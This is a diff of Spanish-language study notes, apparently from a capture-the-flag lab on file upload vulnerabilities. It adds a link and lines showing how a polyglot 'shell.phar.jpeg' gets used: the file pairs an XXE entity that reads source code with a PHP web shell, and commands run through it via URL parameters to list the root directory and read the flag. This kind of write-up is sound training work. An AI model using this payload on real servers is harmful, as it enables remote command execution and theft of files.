@@ -21,6 +21,7 @@ linked:
   - "[[File Upload - Bypass por Confusión y Desincronización]]"
   - "[[File Upload - Shells en PHP]]"
   - "[[File Upload - Desactivación de Validación Front-end]]"
+  - "[[File Upload - XSS y XXE]]"
 ---
 # File Upload - Vulnerabilidades
 
@@ -99,5 +100,12 @@ Creo y subo el archivo `shell.phar.jpeg`:
 cat << 'EOF' > shell.phar.jpeg
 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
 EOF
+```
+
+Cargo la flag a través del cmd desde la url:
+```http
+http://154.57.164.81:32351/contact/user_feedback_submissions/260503_shell.phar.jpeg?cmd=ls+/
+
+http://154.57.164.81:32351/contact/user_feedback_submissions/260503_shell.phar.jpeg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
 ```
 
